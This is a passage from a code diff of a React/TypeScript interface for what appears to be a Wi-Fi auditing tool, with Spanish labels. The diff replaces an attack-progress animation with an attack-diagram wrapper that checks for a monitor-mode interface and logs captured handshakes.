           PHASES.slice(0, phase + 1).map((p, i) => (
             <div key={p.id} style={{ color: i === phase ? p.color : 'rgba(42,255,138,0.28)' }}>
-              <span style={{ opacity: 0.35 }}>[{String(i).padStart(2,'0')}] </span>
-              {p.label}
+              <span style={{ opacity: 0.35 }}>[{String(i).padStart(2,'0')}] </span>{p.label}
               {i < phase && <span style={{ color: SG }}> ✓</span>}
               {i === phase && <span className="animate-pulse"> ▮</span>}
             </div>
@@ -972,8 +1387,8 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
         )}
       </div>
 
-      {/* footer: abort (if WS active) or loader (final phase) */}
-      {captureWsRef.current && phase < PHASES.length - 1 && (
+      {/* footer */}
+      {phase < PHASES.length - 1 && (
         <div className="mx-4 mb-3 shrink-0 flex gap-2">
           <div className="flex-1 flex items-center gap-2 px-3 py-2 rounded"
             style={{ background: 'rgba(42,255,138,0.04)', border: '1px solid rgba(42,255,138,0.08)' }}>
@@ -982,7 +1397,7 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
               {wsAttempt > 1 ? `INTENTO ${wsAttempt}/${wsMaxAttempts}` : 'ATAQUE EN CURSO'}
             </span>
           </div>
-          <button onClick={() => { captureWsRef.current?.close(); captureWsRef.current = null; onFinish() }}
+          <button onClick={() => { captureWsRef.current?.close(); captureWsRef.current = null; setCaptureFailed(true); setCaptureFailMsg('Ataque abortado por el usuario.') }}
             className="px-3 py-2 rounded text-[8px] tracking-widest transition-all"
             style={{ border: '1px solid rgba(255,68,68,0.22)', color: 'rgba(255,68,68,0.50)' }}
             onMouseEnter={e => ((e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,68,68,0.90)')}
@@ -1005,6 +1420,7 @@ function AttackAnimation({ network, onFinish, onHandoff }: {
     </div>
   )
 }
+
 
 // ── RFNetworkPanel (right side) ───────────────────────────────────────────────
 function RFNetworkPanel({ networks, selected, onSelect, search, onSearch, open, onToggle }: {
@@ -1181,6 +1597,41 @@ function RFNetworkPanel({ networks, selected, onSelect, search, onSearch, open, 
         </div>
       </>}
     </div>
+  )
+}
+
+// ── AttackDiagram Wrapper ─────────────────────────────────────────────────────
+function AttackDiagramWrapper({ network, onClose, onHandoff: _onHandoff }: {
+  network: Network
+  onClose: () => void
+  onHandoff: (n: Network) => void
+}) {
+  const selectedInterface = useInterfacesStore(s => s.selected)
+
+  if (!selectedInterface) {
+    return (
+      <div className="absolute inset-0 z-30 flex items-center justify-center" style={{ background: 'rgba(3,6,10,0.98)' }}>
+        <div className="text-center">
+          <div className="text-[12px] font-bold tracking-wider mb-2" style={{ color: '#ff4444' }}>NO HAY INTERFAZ SELECCIONADA</div>
+          <div className="text-[9px]" style={{ color: 'rgba(255,68,68,0.5)' }}>Selecciona una interfaz en modo monitor primero</div>
+          <button onClick={onClose} className="mt-4 px-4 py-2 rounded text-[10px]" style={{ border: '1px solid rgba(255,68,68,0.3)', color: '#ff4444' }}>
+            CERRAR
+          </button>
+        </div>
+      </div>
+    )
+  }
+
+  return (
+    <AttackDiagram
+      network={network}
+      selectedInterface={selectedInterface}
+      onClose={onClose}
+      onHandshakeCaptured={(hsId) => {
+        console.log('Handshake captured:', hsId)
+        // Could trigger cracking UI here
+      }}
+    />
   )
 }
 
@@ -1629,9 +2080,13 @@ export function NetworkMap({ networks, scanning, onAttack, onStart, onStop, filt
         </div>
       )}
 
-      {/* attack animation */}
+      {/* attack diagram - visual Cisco-style interface */}
       {attacking && (
-        <AttackAnimation network={attacking} onFinish={()=>{setAttacking(null);setSelected(null)}} onHandoff={n=>{onAttack(n)}} />
+        <AttackDiagramWrapper
+          network={attacking}
+          onClose={() => { setAttacking(null); setSelected(null) }}
+          onHandoff={n => { onAttack(n) }}
+        />
       )}
     </div>
   )
